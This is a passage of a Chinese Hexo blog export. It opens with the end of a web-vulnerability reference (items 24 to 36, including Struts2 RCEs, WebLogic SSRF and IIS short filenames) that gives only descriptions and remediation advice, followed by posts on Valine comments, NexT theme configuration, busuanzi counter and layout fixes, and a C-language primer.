<p>　　3、在服务器端对相关敏感信息进行模糊化处理。</p>
<p>　　4、对服务器端返回的数据进行严格的检查，满足查询数据与页面显示数据一致。</p>
<h2 id="24-短信-邮件轰炸"><a href="#24-短信-邮件轰炸" class="headerlink" title="24.短信/邮件轰炸"></a>24.短信/邮件轰炸</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　由于没有对短信或者邮件发送次数进行限制，导致可无限次发送短信或邮件给用户，从而造成短信轰炸，进而可能被大量用户投诉，从而影响公司声誉。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　在服务器限制发送短信或邮件的频率，如同一账号1分钟只能发送1次短信或邮件，一天只能发送3次。</p>
<h2 id="25-phpinfo信息泄漏"><a href="#25-phpinfo信息泄漏" class="headerlink" title="25.phpinfo信息泄漏"></a>25.phpinfo信息泄漏</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　Web站点的某些测试页面可能会使用到PHP的phpinfo()函数，会输出服务器的关键信息，造成服务器信息泄露，为攻击提供有利的信息。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、删除phpinfo 函数。</p>
<p>　　2、若文件无用可直接删除。 </p>
<h2 id="26-IIS短文件名泄露漏洞"><a href="#26-IIS短文件名泄露漏洞" class="headerlink" title="26.IIS短文件名泄露漏洞"></a>26.IIS短文件名泄露漏洞</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　Internet Information Services（IIS，互联网信息服务）是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。 Microsoft IIS在实现上存在文件枚举漏洞，攻击者可利用此漏洞枚举网络服务器根目录中的文件。危害：攻击者可以利用“~”字符猜解或遍历服务器中的文件名，或对IIS服务器中的.Net Framework进行拒绝服务攻击。</p>
<p>　　攻击者可通过该漏洞尝试获取网站服务器文件的文件名，达到获取更多信息来入侵服务器的目的。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　修改Windows配置，关闭短文件名功能。</p>
<p>　　1.关闭NTFS 8.3文件格式的支持。该功能默认是开启的，对于大多数用户来说无需开启。</p>
<p>　　2.如果是虚拟主机空间用户,可采用以下修复方案：</p>
<p>　　1）修改注册列表HKLM\SYSTEM\CurrentControlSet\Control\FileSystem\NtfsDisable8dot3NameCreation的值为1(此修改只能禁止NTFS8.3格式文件名创建,已经存在的文件的短文件名无法移除)。</p>
<p>　　2）如果你的web环境不需要asp.net的支持你可以进入Internet 信息服务(IIS)管理器 — Web 服务扩展 - ASP.NET 选择禁止此功能。</p>
<p>　　3）升级net framework 至4.0以上版本。</p>
<p>　　3.将web文件夹的内容拷贝到另一个位置，比如D:\www到D:\<a href="http://www.back,然后删除原文件夹d/www%EF%BC%8C%E5%86%8D%E9%87%8D%E5%91%BD%E5%90%8DD:/www.back%E5%88%B0D:/www%E3%80%82%E5%A6%82%E6%9E%9C%E4%B8%8D%E9%87%8D%E6%96%B0%E5%A4%8D%E5%88%B6%EF%BC%8C%E5%B7%B2%E7%BB%8F%E5%AD%98%E5%9C%A8%E7%9A%84%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D%E5%88%99%E6%98%AF%E4%B8%8D%E4%BC%9A%E6%B6%88%E5%A4%B1%E7%9A%84%E3%80%82">www.back，然后删除原文件夹D:\www，再重命名D:\www.back到D:\www。如果不重新复制，已经存在的短文件名则是不会消失的。</a></p>
<h2 id="27-应用程序错误信息泄露"><a href="#27-应用程序错误信息泄露" class="headerlink" title="27.应用程序错误信息泄露"></a>27.应用程序错误信息泄露</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　攻击者可通过特殊的攻击向量，使web服务器出现500、403等相关错误，导致信息泄漏如绝对路径、webserver版本、源代码、sql语句等敏感信息，恶意攻击者很有可能利用这些信息实施进一步的攻击。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、自定义错误页面或使用统一的错误页面提示。</p>
<h2 id="28-Apache-Tomcat默认文件"><a href="#28-Apache-Tomcat默认文件" class="headerlink" title="28.Apache Tomcat默认文件"></a>28.Apache Tomcat默认文件</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　Apache Tomcat默认样例文件没有删除或限制访问，可能存在cookie、session伪造，进行后台登录操作</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、删除样例文件</p>
<p>　　2、限制文件访问权限</p>
<h2 id="29-Crossdomain-xml-配置不当"><a href="#29-Crossdomain-xml-配置不当" class="headerlink" title="29.Crossdomain.xml 配置不当"></a>29.Crossdomain.xml 配置不当</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　网站根目录下的 crossdomain.xml 文件指明了远程Flash 是否可以加载当前网站的资源（图片、网页内容、Flash等）。如果配置不当，可能导致遭受跨站请求伪造（CSRF）攻击。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　对于不需要从外部加载资源的网站，在 crossdomain.xml 文件中更改allow-access-from的domain属性为域名白名单。</p>
<h2 id="30-目标服务器启用了不安全-HTTP-方法"><a href="#30-目标服务器启用了不安全-HTTP-方法" class="headerlink" title="30.目标服务器启用了不安全 HTTP 方法"></a>30.目标服务器启用了不安全 HTTP 方法</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　目标服务器启用了不安全的传输方法，如PUT、TRACE、DELETE、MOVE等，这些方法表示可能在服务器上使用了 WebDAV，由于dav方法允许客户端操纵服务器上的文件，如上传、修改、删除相关文件等危险操作，如果没有合理配置dav，有可能允许未授权的用户对其进行利用，修改服务器上的文件。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、关闭不安全的传输方法，只开启POST、GET方法。</p>
<p>　　2、如果服务器不使用 WebDAV 可直接禁用，或为允许webdav的目录配置严格的访问权限，如认证方法，认证需要的用户名，密码。</p>
<h2 id="31-weblogic-SSRF服务器请求伪造"><a href="#31-weblogic-SSRF服务器请求伪造" class="headerlink" title="31.weblogic SSRF服务器请求伪造"></a>31.weblogic SSRF服务器请求伪造</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　目标存在weblogic SSRF服务器请求伪造漏洞。WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。Weblogic中间件默认带有“UDDI 目录浏览器”且为未授权访问，通过该应用，可进行无回显的SSRF请求。攻击者可利用该漏洞对企业内网进行大规模扫描，了解内网结构，并可能结合内网漏洞直接获取服务器权限。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、若不影响业务则可删除uddiexplorer文件夹</p>
<p>　　2、限制uddiexplorer应用只能内网访问</p>
<h2 id="32-Apache-Struts2-远程代码执行漏洞（S2-019）"><a href="#32-Apache-Struts2-远程代码执行漏洞（S2-019）" class="headerlink" title="32.Apache Struts2 远程代码执行漏洞（S2-019）"></a>32.Apache Struts2 远程代码执行漏洞（S2-019）</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　Apache Struts2的“Dynamic MethodInvocation”机制是默认开启的，仅提醒用户如果可能的情况下关闭此机制，如果未关闭此机制将导致远程代码执行漏洞，远程攻击者可利用此漏洞在受影响应用上下文中执行任意代码。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载。</p>
<p>　　2、或者手工设置struts.xml文件&lt;constantname=”struts.enable.DynamicMethodInvocation”value=”false”/&gt;</p>
<h2 id="33-Apache-Struts2-远程代码执行漏洞（S2-037）"><a href="#33-Apache-Struts2-远程代码执行漏洞（S2-037）" class="headerlink" title="33.Apache Struts2 远程代码执行漏洞（S2-037）"></a>33.Apache Struts2 远程代码执行漏洞（S2-037）</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　Apache Struts2在使用REST插件时，攻击者可以绕过动态方法执行的限制，调用恶意表达式执行远程代码。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　建议用户到官方获取最新补丁或者最新版本程序。</p>
<h2 id="34-Apache-Struts2-DevMode-远程代码执行漏洞"><a href="#34-Apache-Struts2-DevMode-远程代码执行漏洞" class="headerlink" title="34.Apache Struts2 DevMode 远程代码执行漏洞"></a>34.Apache Struts2 DevMode 远程代码执行漏洞</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　为了便于开发人员调试程序，Struts2提供了一个devMode模式，可以方便查看程序错误以及日志等信息。当Struts2中的devMode模式设置为true时，存在严重远程代码执行漏洞。如果WebService 启动权限为最高权限时，可远程执行任意命令，包括关机、建立新用户、以及删除服务器上所有文件等等。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　建议用户到官方获取最新补丁或者最新版本程序。</p>
<p>　　或者将struts.properties中的devMode设置为false，或是在struts.xml中添加如下代码： &lt;constant name=”struts.devMode”value=”false”/&gt;。</p>
<h2 id="35-Apache-Struts2-远程代码执行漏洞（S2-045）"><a href="#35-Apache-Struts2-远程代码执行漏洞（S2-045）" class="headerlink" title="35.Apache Struts2 远程代码执行漏洞（S2-045）"></a>35.Apache Struts2 远程代码执行漏洞（S2-045）</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　Apache Struts2的Jakarta Multipartparser插件存在远程代码执行漏洞，漏洞编号为CVE-2017-5638。攻击者可以在使用该插件上传文件时，修改HTTP请求头中的Content-Type值来触发该漏洞，导致远程执行代码。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　检测方式查看web目录下/WEB-INF/lib/目录下的struts-core.x.x.jar ，如果这个版本在Struts2.3.5 到 Struts2.3.31 以及 Struts2.5 到 Struts2.5.10之间则存在漏洞。</p>
<p>　　1、建议用户到官方获取最新补丁或者最新版本程序。</p>
<p>　　2、更新至Strusts2.3.32或者Strusts2.5.10.1，或使用第三方的防护设备进行防护。</p>
<p>　　3、临时解决方案：删除commons-fileupload-x.x.x.jar文件（会造成上传功能不可用）。</p>
<p>　　4、修改WEB-INF/classes目录下的配置</p>
<p>　　在WEB-INF/classes目录下的struts.xml中的struts 标签下添加</p>
<p>　　&lt;constantname=”struts.custom.i18n.resources”value=”global”/&gt;；</p>
<p>　　在WEB-INF/classes/目录下添加global.properties，文件内容如下:</p>
<p>　　struts.messages.upload.error.InvalidContentTypeException=1</p>
<h2 id="36-Apache-Struts2-远程代码执行漏洞（S2-033）"><a href="#36-Apache-Struts2-远程代码执行漏洞（S2-033）" class="headerlink" title="36.Apache Struts2 远程代码执行漏洞（S2-033）"></a>36.Apache Struts2 远程代码执行漏洞（S2-033）</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　Apache Struts2在开启动态方法调用（DynamicMethod Invocation）的情况下，攻击者使用REST插件调用恶意表达式可以远程执行代码。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、用户到官方获取最新补丁或者最新版本程序。</p>
<p>　　2、或者在允许的情况下禁用动态方法调用（Dynamic Method Invocation），修改Struts2的配置文件struts.xml，将struts.enable.DynamicMethodInvocation设置为“false”。</p>
]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Web工具包</tag>
      </tags>
  </entry>
  <entry>
    <title>valine</title>
    <url>/2022/01/18/valine/</url>
    <content><![CDATA[<p>Hexo NexT 评论系统 Valine 的使用</p>
<span id="more"></span>

<p>这个valine评论系统我感觉很方便，不用进行繁琐的登录就可评论，在这里说一下配置方法！</p>
<h1 id="开启评论系统"><a href="#开启评论系统" class="headerlink" title="开启评论系统"></a>开启评论系统</h1><p>1注册 <a href="https://leancloud.cn/">LeanCloud</a></p>
<p>2.创建 Valine 应用，名称任意</p>
<p>3.进入对应的应用，点击 <code>设置 -&gt; 应用 Keys</code>，获取 <code>AppID</code> 和 <code>AppKey</code></p>
<p>4 在 Hexo 博客主题配置文件 <code>next/_config.yml</code> 中进行配置，可根据自己喜好来设置该评论系统。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">valine:</span><br><span class="line">  enable: true # 设置为true，默认为false</span><br><span class="line">  appid:  # 将应用key的App ID设置在这里</span><br><span class="line">  appkey: # 将应用key的App Key设置在这里</span><br><span class="line">  notify: false# 邮箱通知 , https://github.com/xCss/Valine/wiki，默认为false</span><br><span class="line">  verify: false# 验证码 默认为false</span><br><span class="line">  placeholder: Just go go ^_^ # 初始化评论显示，根据自己修改，这里默认，</span><br><span class="line">  avatar: monsterid # 头像风格，默认为mm，可进入网址：https://valine.js.org/visitor.html查看头像设置，这里有许多头像风格，进行设置</span><br><span class="line">  guest_info: nick,mail,link # 自定义评论标题</span><br><span class="line">  pageSize: 10 # 分页大小，10页就自动分页</span><br><span class="line">  visitor: true # 是否允许游客评论 ，进入官网查看设置：https://valine.js.org/visitor.html</span><br></pre></td></tr></table></figure>

<p>这样就可以开启此评论系统！</p>
<h2 id="Valine-的配置"><a href="#Valine-的配置" class="headerlink" title="Valine 的配置"></a>Valine 的配置</h2><h2 id="查看评论"><a href="#查看评论" class="headerlink" title="查看评论"></a>查看评论</h2><p>点击 <code>存储 -&gt; 结构化数据</code>，选择 <code>创建 Class</code>，名称 <code>Comment</code>，其他保持默认，以后就可在此 Class 内查看</p>
<blockquote>
<p>注：选择 <code>Valine</code> 评论系统是因为支持国内网络，不需要连接外网（翻墙）就可以进行显示评论系统，而且很好管理，页面简单</p>
</blockquote>
<h2 id="文章阅读量统计"><a href="#文章阅读量统计" class="headerlink" title="文章阅读量统计"></a>文章阅读量统计</h2><p>点击 <code>存储 -&gt; 结构化数据</code>，选择<code>创建 Class</code>，名称 <code>Counter</code>，其他保持默认，以后就可在此 Class 内查看</p>
<p>在 leancloud 中的应用设置界面中，通过【设置 | 安全中心】菜单，将我们博客的域名添加到安全中心，</p>
<p>如下：<img src="/2022/01/18/valine/image-20220203120812965.png" alt="image-20220203120812965"></p>
<h1 id="邮件通知功能"><a href="#邮件通知功能" class="headerlink" title="邮件通知功能"></a>邮件通知功能</h1><h4 id="原邮箱模板通知功能"><a href="#原邮箱模板通知功能" class="headerlink" title="原邮箱模板通知功能"></a>原邮箱模板通知功能</h4><p>修改主题配置文件：notify改成 true</p>
<ul>
<li>打开 LeanCloud 的控制台，然后进入应用的设置界面，然后通过【云引擎 | 设置】菜单，进入到云引擎的相关配置面板，然后在”自定义环境变量”处新建以下变量名和值：<img src="/2022/01/18/valine/20200710121115583.png" alt="img"></li>
</ul>
<p>关于”SMTP_PASS”的值获取方式如下：</p>
<p>首先打开 QQ 邮箱界面，然后依次点击【设置 | 账户】菜单，如下：</p>
<p><img src="/2022/01/18/valine/image-20220203122055181.png" alt="image-20220203122055181"></p>
<p>然后点击下方，开启 IMAP/SMTP 服务，开启后会得到一串字符串，将那一串字符串复制粘贴到云引擎面板中的”SMTP_PASS”属性后面作为它的值。</p>
<ul>
<li>接下来部署生产环境。依次点击【云引擎 | 部署】菜单，打开部署界面，然后通过如下所示部署 Valine-Admin，如下：</li>
</ul>
<p><img src="/2022/01/18/valine/20200710121318224.png" alt="img"></p>
<p>以上的 GitHub 地址如下”<a href="https://github.com/DesertsP/Valine-Admin.git&quot;%EF%BC%8C%E5%BF%85%E9%A1%BB%E9%85%8D%E7%BD%AE%E8%BF%99%E4%B8%AA%E5%9C%B0%E5%9D%80%E3%80%82">https://github.com/DesertsP/Valine-Admin.git&quot;，必须配置这个地址。</a></p>
<p>部署<img src="/2022/01/18/valine/image-20220203122241800.png" alt="image-20220203122241800"></p>
<ul>
<li>部署成功后，我们设置定时任务，因为免费的 LeanCloud 会有自动休眠模式，所以要设置定时任务然它自动重启，操作过程如下：</li>
</ul>
<p><img src="/2022/01/18/valine/image-20220203122844414.png" alt="image-20220203122844414"></p>
<blockquote>
<ol>
<li>`自动唤醒<br>Cron 表达式为 0 0/30 7-23 * * ? 表示每天早 7 点到晚 23 点每隔 30 分钟访问云引擎</li>
<li>每天定时检查 24 小时内漏发的邮件通知<br>Cron 表达式为 0 0 8 * * ? 定时检查 24 小时内漏发的邮件通知</li>
</ol>
</blockquote>
<ul>
<li>定时任务设置完成后，为云引擎绑定一个域名，为了保证后续邮件提醒功能正常。但是在此处要求是一个备案的域名，这样绑定即可：（点击云引擎绑定新域名）</li>
</ul>
<p><img src="/2022/01/18/valine/image-20220203123121367.png" alt="image-20220203123121367"></p>
<p>至此邮箱通知就完成了！</p>
]]></content>
      <categories>
        <category>博客相关问题类</category>
      </categories>
      <tags>
        <tag>博客</tag>
        <tag>评论系统</tag>
      </tags>
  </entry>
  <entry>
    <title>开启博客之旅</title>
    <url>/2021/12/30/test/</url>
    <content><![CDATA[<p>历经两天的博客搭建和美化，最终成功开启了博客之旅。下面我总结一下这次博客搭建的类型和作用，大家有意见或建议都可以在评论区提出来。</p>
<span id="more"></span>

<h1 id="博客的类型"><a href="#博客的类型" class="headerlink" title="博客的类型"></a>博客的类型</h1><p>本博客是采用云服务器，避免花大量资金购买服务器和备案，域名为阿里云购买的.top，将博客搭载到GitHub服务器上，采用hexo构建，主体采用next主题，并开启了看板娘功能(挺有趣的）。</p>
<h1 id="博客的作用"><a href="#博客的作用" class="headerlink" title="博客的作用"></a>博客的作用</h1><p>今后我将会在博客分享自己的学习经验和知识交流，也可以为广大网友解决问题，同时也会把我看到的觉得适合收藏的知识分享在这上面，此博客是深度交流沟通的网络新方式。</p>
<h1 id="开启博客之旅"><a href="#开启博客之旅" class="headerlink" title="开启博客之旅"></a>开启博客之旅</h1><p>让我们一起开启博客的旅途吧！！！</p>
<p><img src="/../../public/images/R-C.103add1996f9349bfd2fff6889db4164rik=Eafe60O3MNhfeQ&riu=http://img95.699pic.com/photo/50047/3787.jpg_wh860.jpg&ehk=8Ctrqqgwzar/SnM28+bVq48uCf5Eb4fzhazNY6yX1PE=&risl=&pid=ImgRaw&r=0"></p>
]]></content>
      <categories>
        <category>心得类</category>
      </categories>
      <tags>
        <tag>心得</tag>
      </tags>
  </entry>
  <entry>
    <title>不蒜子相关问题</title>
    <url>/2022/01/19/%E4%B8%8D%E8%92%9C%E5%AD%90%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>不蒜子统计相关问题</p>
<span id="more"></span>

<p>不蒜子统计访客量总是不显示，这个问题我差了很多资料，希望可以帮到大家！NexT 预置了不蒜子提供的网页计数功能。只需要在配置文件中启用即可！</p>
<p>至于为啥总是不显示数据，初步发现应该和看板娘Live2D冲突导致的！</p>
<h1 id="导致原因"><a href="#导致原因" class="headerlink" title="导致原因"></a>导致原因</h1><p>添加 Live2D 后网页的不蒜子部分源码的 <code>style</code> 从 <code>&quot;display: inline;&quot;</code> 替换为了 <code>&quot;display: none;&quot;</code></p>
<h1 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h1><p>删除不蒜子部分的 <code>id</code> 和 <code>style</code> 属性，重新部署网页即可解决该问题。</p>
<p><code>next/layout/_third-party/statistics/busuanzi-counter.swig</code> 中修改的是网页页脚部分的不蒜子显示，<code>next/layout/_macro/post.swig</code> 中修改的博客文章阅览数的不蒜子显示。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%- if theme.busuanzi_count.total_visitors %&#125;</span><br><span class="line">  &lt;span class=&quot;post-meta-item&quot; id=&quot;busuanzi_container_site_uv&quot; style=&quot;display: none;&quot;&gt;</span><br><span class="line">    &lt;!-- ... --&gt;</span><br><span class="line">  &lt;/span&gt;</span><br><span class="line">&#123;%- endif %&#125;</span><br><span class="line"></span><br><span class="line">&lt;!-- ... --&gt;</span><br><span class="line"></span><br><span class="line">&#123;%- if theme.busuanzi_count.total_views %&#125;</span><br><span class="line">  &lt;span class=&quot;post-meta-item&quot; id=&quot;busuanzi_container_site_pv&quot; style=&quot;display: none;&quot;&gt;</span><br><span class="line">    &lt;!-- ... --&gt;</span><br><span class="line">  &lt;/span&gt;</span><br><span class="line">&#123;%- endif %&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%- if not is_index and theme.busuanzi_count.enable and theme.busuanzi_count.post_views %&#125;</span><br><span class="line">  &lt;span class=&quot;post-meta-item&quot; title=&quot;&#123;&#123; __(&#x27;post.views&#x27;) &#125;&#125;&quot; id=&quot;busuanzi_container_page_pv&quot; style=&quot;display: none;&quot;&gt;</span><br><span class="line">    &lt;!-- ... --&gt;</span><br><span class="line">  &lt;/span&gt;</span><br><span class="line">&#123;%- endif %&#125;</span><br></pre></td></tr></table></figure>

<h1 id="暴力解决"><a href="#暴力解决" class="headerlink" title="暴力解决"></a>暴力解决</h1><p>直接关上看板娘！！！</p>
]]></content>
      <categories>
        <category>博客相关问题类</category>
      </categories>
      <tags>
        <tag>不蒜子不显示</tag>
      </tags>
  </entry>
  <entry>
    <title>新版next置换</title>
    <url>/2022/01/18/%E6%96%B0%E7%89%88next%E7%BD%AE%E6%8D%A2/</url>
    <content><![CDATA[<p>当旧版next主题失效时该怎么办</p>
<span id="more"></span>

<p>写这篇文章主要是害怕哪天自己的博客炸了，一时找不到解决办法，所以先写好以备不时之需。</p>
<h1 id="导入主题"><a href="#导入主题" class="headerlink" title="导入主题"></a>导入主题</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/theme-next/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>

<p>然后打开站点配置，在theme里将landscape改为next，language把en修改成zh-CN。</p>
<h1 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h1><p>在themes\next中的_config.yml中进行编辑</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">menu:</span><br><span class="line">  home: / ||fa fa-home</span><br><span class="line">  #about: /about/ || user</span><br><span class="line">  tags: /tags/ ||fa fa-tags</span><br><span class="line">  categories: /categories/ ||fa fa-th</span><br><span class="line">  archives: /archives/ ||fa fa-archive</span><br><span class="line">  #schedule: /schedule/ || calendar</span><br><span class="line">  #sitemap: /sitemap.xml || sitemap</span><br><span class="line">  #commonweal: /404/ || heartbeat</span><br><span class="line">  links: /links/ ||fa fa-link</span><br></pre></td></tr></table></figure>

<p>文章分段栏</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">toc:</span><br><span class="line">  enable: true #改成true以启用</span><br><span class="line">  number: true #自动生成编号</span><br><span class="line">  # 以下默认</span><br><span class="line">  wrap: false</span><br><span class="line">  expand_all: false</span><br><span class="line">  max_depth: 6</span><br></pre></td></tr></table></figure>

<p>联系方式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">social:</span><br><span class="line">  #GitHub: https://github.com/HZY030628 || github</span><br><span class="line">  E-Mail: mailto:2596328958@qq.com || envelope</span><br><span class="line">  #Weibo: https://weibo.com/yourname || fab fa-weibo</span><br><span class="line">  #Google: https://plus.google.com/yourname || fab fa-google</span><br><span class="line">  #Twitter: https://twitter.com/yourname || fab fa-twitter</span><br><span class="line">  #FB Page: https://www.facebook.com/yourname || fab fa-facebook</span><br><span class="line">  #StackOverflow: https://stackoverflow.com/yourname || fab fa-stack-overflow</span><br><span class="line">  #YouTube: https://youtube.com/yourname || fab fa-youtube</span><br><span class="line">  #Instagram: https://instagram.com/yourname || fab fa-instagram</span><br><span class="line">  #Skype: skype:yourname?call|chat || fab fa-skype</span><br></pre></td></tr></table></figure>

<p>头像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">avatar:</span><br><span class="line">  # Replace the default image and set the url here.</span><br><span class="line">  url: /images/avatar.png</span><br><span class="line">  # If true, the avatar will be dispalyed in circle.</span><br><span class="line">  rounded: true #若为true，则头像为圆形</span><br><span class="line">  # If true, the avatar will be rotated with the cursor.</span><br><span class="line">  rotated: true #若为true，则鼠标碰到头像时旋转</span><br></pre></td></tr></table></figure>

<p>头像跟标签页图标一样，需要把图片复制粘贴到image中，再修改文件名。</p>
]]></content>
      <categories>
        <category>博客相关问题类</category>
      </categories>
      <tags>
        <tag>博客</tag>
        <tag>next主题失效</tag>
      </tags>
  </entry>
  <entry>
    <title>框架问题</title>
    <url>/2022/01/19/%E6%A1%86%E6%9E%B6%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>框架问题</p>
<span id="more"></span>

<p>这个问题我觉得值得记录一下，因为有时候很小的事可能就会浪费很多时间，在这里我特别感谢一下帮助我的一个博主[大佬]: <a href="https://szqlovegw.top/">https://szqlovegw.top</a><br>这可能是个很小的问题，但是对于小白的我，是个很大的问题!毕竟是自己的博客，想尽力优化的更好，毛病更少，所以我就发现在我添加了标签云之后，有些页面会出现异常，进度条到最下面时会自动弹上来（强迫症看了会当场去世，在这里我就不插图了）。下面就来说一下原因和解决方法吧</p>
<h1 id="导致原因"><a href="#导致原因" class="headerlink" title="导致原因"></a>导致原因</h1><p>因为左边的个人资料栏太长导致个别页面滚到最下面的时候出现塌陷从而出现异常！</p>
<h1 id="解决方式"><a href="#解决方式" class="headerlink" title="解决方式"></a>解决方式</h1><p>字面意思喽，很容易想到，当然是加宽右边的页面大小，这样就不会塌陷!</p>
<p>在 <code>博客/themes/next/source/css</code>目录下找到<code>main.styl</code>,在里面最下面加上下面的代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.content-wrap&#123;</span><br><span class="line">    min-height:1000px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>完成之后重新部署一下就可以解决问题了！</p>
]]></content>
      <categories>
        <category>博客相关问题类</category>
      </categories>
      <tags>
        <tag>、 - 博客死循环框架问题</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言系统学习</title>
    <url>/2022/01/15/C/</url>
    <content><![CDATA[<p>C语言系统学习</p>
<span id="more"></span>

<h2 id="常见的计算机语言类型"><a href="#常见的计算机语言类型" class="headerlink" title="常见的计算机语言类型"></a>常见的计算机语言类型</h2><h2 id="机器语言"><a href="#机器语言" class="headerlink" title="机器语言"></a>机器语言</h2><p>所有的代码里面只有0和1, 0表示不加电,1表示加电(纸带存储时 1有孔,0没孔)<br>优点：直接对硬件产生作用，程序的执行效率非常非常高<br>缺点：指令又多又难记、可读性差、无可移植性</p>
<h2 id="汇编语言"><a href="#汇编语言" class="headerlink" title="汇编语言"></a>汇编语言</h2><p>符号化的机器语言，用一个符号（英文单词、数字）来代表一条机器指令<br>优点：直接对硬件产生作用，程序的执行效率非常高、可读性稍好<br>缺点：符号非常多和难记、无可移植性</p>
<h2 id="高级语言"><a href="#高级语言" class="headerlink" title="高级语言"></a>高级语言</h2><p>非常接近自然语言的高级语言，语法和结构类似于普通英文<br>优点：简单、易用、易于理解、远离对硬件的直接操作、有可移植性<br>缺点：有些高级语言写出的程序执行效率并不高<br>对比(利用3种类型语言编写1+1)</p>
<p>机器语言<br>10111000 00000001 00000000 00000101 00000001 00000000</p>
<p>汇编语言<br>MOV AX, 1 ADD AX, 1</p>
<p>高级语言<br>1 + 1</p>
<h2 id="什么是C语言"><a href="#什么是C语言" class="headerlink" title="什么是C语言?"></a>什么是C语言?</h2><p>C语言是一种用于和计算机交流的高级语言, 它既具有高级语言的特点，又具有汇编语言的特点<br>非常接近自然语言<br>程序的执行效率非常高<br>C语言是所有编程语言中的经典，很多高级语言都是从C语言中衍生出来的，<br>例如:C++、C#、Object-C、Java、Go等等<br>C语言是所有编程语言中的经典，很多著名的系统软件也是C语言编写的<br>几乎所有的操作系统都是用C语言编写的<br>几乎所有的计算机底层软件都是用C语言编写的<br>几乎所有的编辑器都是C语言编写的</p>
<h2 id="C语言程序组成"><a href="#C语言程序组成" class="headerlink" title="C语言程序组成"></a>C语言程序组成</h2><p>手机有很多功能, “开机”,“关机”,“打电话”,“发短信”,”拍照”等等</p>
<p>手机中的每一个功能就相当于C语言程序中的一个程序段(函数)</p>
<p>众多功能中总有一个会被先执行,不可能多个功能一起执行</p>
<p>想使用手机必须先执行手机的开机功能</p>
<p>所以C语言程序也一样,由众多功能、众多程序段组成, 众多C语言程序段中总有一个会被先执行, 这个先执行的程序段我们称之为”主函数”</p>
<p>一个C语言程序由多个”函数”构成,每个函数有自己的功能</p>
<p>一个程序<em><strong>有且只有一个主函数</strong></em></p>
<p>如果一个程序没有主函数,则这个程序不具备运行能力</p>
<p>程序运行时系统会<em><strong>自动调用</strong></em>主函数,而其它函数需要开发者<em><strong>手动调用</strong></em></p>
<p>主函数有固定书写的格式和范写</p>
<h2 id="函数定义格式"><a href="#函数定义格式" class="headerlink" title="函数定义格式"></a>函数定义格式</h2><ul>
<li>主函数定义的格式:<ul>
<li>int 代表函数执行之后会返回一个整数类型的值</li>
<li>main 代表这个函数的名字叫做main</li>
<li>() 代表这是一个函数</li>
<li>{} 代表这个程序段的范围</li>
<li>return 0; 代表函数执行完之后返回整数0</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// insert code here...</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>其它函数定义的格式<ul>
<li>int 代表函数执行之后会返回一个整数类型的值</li>
<li>call 代表这个函数的名字叫做call</li>
<li>() 代表这是一个函数</li>
<li>{} 代表这个程序段的范围</li>
<li>return 0; 代表函数执行完之后返回整数0</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">call</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

